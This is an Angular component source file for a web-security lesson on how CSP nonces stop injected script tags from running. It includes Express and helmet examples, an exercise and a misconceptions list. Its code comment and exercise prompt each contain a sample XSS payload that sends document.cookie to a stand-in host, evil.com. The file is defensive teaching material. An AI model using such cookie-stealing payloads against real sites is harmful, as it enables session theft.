import { Component } from '@angular/core';
import { CommonModule } from '@angular/common';
import { SubtopicEyebrowComponent } from '../../../../../shared/subtopic-eyebrow/subtopic-eyebrow';
import { PageMetaComponent } from '../../../../../shared/page-meta/page-meta';
import { TheoryBlockComponent, TheoryPoint } from '../../../../../shared/theory-block/theory-block';
import { CodeBlockComponent, CodeTab } from '../../../../../shared/code-block/code-block';
import { TryItComponent, TryItExercise } from '../../../../../shared/try-it/try-it';
import { MisconceptionsComponent, Misconception } from '../../../../../shared/misconceptions/misconceptions';
import { SubtopicNavComponent } from '../../../../../shared/subtopic-nav/subtopic-nav';

const theory: TheoryPoint[] = [
  {
    heading: 'Tracing a Nonce Through One Request',
    points: [
      'The server generates a fresh, cryptographically random nonce for every single response (never reused) — e.g. <code>crypto.randomBytes(16).toString(\'base64\')</code> — and sends it in the response header: <code>Content-Security-Policy: script-src \'self\' \'nonce-Xk9f...\'</code>.',
      'The SAME nonce value is written onto every legitimate <code>&lt;script&gt;</code> tag the server renders in that response\'s HTML: <code>&lt;script nonce="Xk9f..."&gt;/* trusted app code */&lt;/script&gt;</code>.',
      'The browser checks each <code>&lt;script&gt;</code> tag\'s <code>nonce</code> attribute against the value in the CSP header BEFORE executing it — a script whose nonce attribute is missing, wrong, or absent is blocked and never runs, regardless of where it came from in the DOM.',
      'This is exactly why a reflected or stored XSS payload gets blocked even when it successfully makes it into the page\'s HTML: the attacker cannot predict the next response\'s random nonce, so their injected <code>&lt;script&gt;</code> tag has no matching (or any) <code>nonce</code> attribute.',
    ],
  },
  {
    heading: 'A Deliberate, Backward-Compatible Pattern',
    points: [
      'Policy: <code>script-src \'nonce-{value}\' \'unsafe-inline\'</code> — modern browsers that understand the nonce IGNORE <code>\'unsafe-inline\'</code> entirely and enforce the nonce; older browsers that don\'t understand nonces fall back to <code>\'unsafe-inline\'</code> instead of blocking every inline script outright.',
      'This is a documented, intentional deployment pattern (Google\'s own Strict CSP guidance recommends it) — NOT a mistake or a leftover that weakens a nonce-based policy on any browser that actually supports nonces.',
      'The main page\'s own mistake block warns against <code>unsafe-inline</code> as an absolute rule — that warning is correct for a policy WITHOUT a nonce; paired WITH a nonce in the same directive, it becomes a safe, no-cost compatibility fallback instead.',
    ],
  },
];

const codeTabs: CodeTab[] = [
  {
    label: 'Nonce Generation + Verification, Traced',
    language: 'typescript',
    code: `import crypto from 'crypto';

app.use((req, res, next) => {
  // Fresh, unpredictable nonce -- generated ONCE per response, never
  // reused, never derived from anything an attacker could guess.
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  next();
});

app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    \`script-src 'self' 'nonce-\${res.locals.nonce}'\`
  );
  next();
});

app.get('/comments', requireAuth, async (req, res) => {
  const comments = await db.comments.findAll();
  // Every legitimate <script> tag gets the SAME per-response nonce:
  res.render('comments', { comments, nonce: res.locals.nonce });
});

// In the rendered template:
//   <script nonce="<%= nonce %>">initApp();</script>
//
// Now suppose one comment in \`comments\` was never output-encoded and
// contains: <script>fetch('https://evil.com/steal?c='+document.cookie)</script>
//
// It reaches the HTML exactly as written -- the injection itself
// still happened. But the browser checks THIS script tag's nonce
// attribute against the CSP header's nonce-Xk9f... value:
//
//   Legit tag:    <script nonce="Xk9f...">initApp();</script>       -- MATCHES, runs
//   Injected tag: <script>fetch(...)</script>                        -- NO nonce at all, BLOCKED
//
// The attacker cannot know next response's nonce in advance -- it's
// regenerated fresh every single request -- so their payload has no
// way to acquire a matching attribute.`,
  },
  {
    label: 'Deploying nonce + unsafe-inline for Backward Compatibility',
    language: 'typescript',
    code: `import helmet from 'helmet';

app.use((req, res, next) => {
  res.locals.nonce = require('crypto').randomBytes(16).toString('base64');
  next();
});

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'none'"],
    scriptSrc: [
      "'self'",
      (req: any, res: any) => \`'nonce-\${res.locals.nonce}'\`,
      "'unsafe-inline'", // deliberately included -- see below
    ],
  },
}));

// Why 'unsafe-inline' is safe to include here:
//
// Per the CSP spec, when a script-src directive contains a nonce (or
// a hash), browsers that understand nonces IGNORE 'unsafe-inline'
// completely -- it has zero effect on any modern browser. Its ONLY
// purpose is as a fallback for browsers old enough to not understand
// the nonce syntax at all -- those browsers see 'unsafe-inline' and
// fall back to allowing inline scripts, rather than the page breaking
// entirely because every script gets silently blocked.
//
// Net effect:
//   Modern browser:  nonce enforced, 'unsafe-inline' ignored
//   Ancient browser: no nonce support, 'unsafe-inline' is the policy
//
// This is Google's own recommended way to deploy a strict, nonce-
// based CSP without breaking legacy browser support.`,
  },
];

const exercise: TryItExercise = {
  prompt: 'An attacker successfully injects <code>&lt;script&gt;document.location=\'https://evil.com/steal?c=\'+document.cookie&lt;/script&gt;</code> into a comment field that gets rendered without output encoding. The page has <code>Content-Security-Policy: script-src \'self\' \'nonce-{random}\'</code>. Does the injected script execute?',
  hint: 'Does the injected <code>&lt;script&gt;</code> tag carry the current response\'s nonce attribute?',
  solution: `// No -- the script does not execute.

// The attacker's payload has no "nonce" attribute at all, because
// they cannot predict the value, which changes on every single
// response. The browser refuses to execute it even though the tag
// made it all the way into the rendered HTML.

// Important distinction: CSP here is limiting the IMPACT of the
// injection, not preventing the injection itself. The underlying bug
// -- rendering a comment without output encoding -- is still real and
// should still be fixed. CSP is a second, independent layer of
// defense, not a substitute for the first one.`,
};

const misconceptions: Misconception[] = [
  {
    thought: 'A CSP nonce is like a CSRF token tied to the current user\'s session.',
    reality: 'It\'s a per-RESPONSE (not per-user or per-session) random value, regenerated fresh on every single page load, completely unrelated to authentication or session state. Two different requests from the SAME logged-in user get two different nonces.',
  },
  {
    thought: 'Adding <code>\'unsafe-inline\'</code> to a nonce-based CSP always weakens security, no exceptions.',
    reality: 'Modern browsers ignore <code>\'unsafe-inline\'</code> entirely whenever a nonce is present in the same directive — it only ever takes effect as a fallback for very old browsers that don\'t understand nonce syntax. This is a real, spec-defined behavior, not a loophole.',
  },
  {
    thought: 'CSP nonces prevent XSS injection from happening in the first place.',
    reality: 'CSP limits what an ALREADY-injected script can do — specifically, whether the browser will execute it. It does nothing to stop the injection itself from reaching the page\'s HTML; output encoding is still the primary defense against that.',
  },
];

@Component({
  selector: 'app-sec-xss-csp-nonce',
  standalone: true,
  imports: [CommonModule, SubtopicEyebrowComponent, PageMetaComponent, TheoryBlockComponent,
    CodeBlockComponent, TryItComponent, MisconceptionsComponent, SubtopicNavComponent],
  templateUrl: './csp-nonces-why-an-injected-script-tag-gets-blocked.html',
  styleUrl: './csp-nonces-why-an-injected-script-tag-gets-blocked.scss',
})
export class CspNoncesWhyAnInjectedScriptTagGetsBlockedSubtopic {
  theory = theory;
  codeTabs = codeTabs;
  exercise = exercise;
  misconceptions = misconceptions;
}
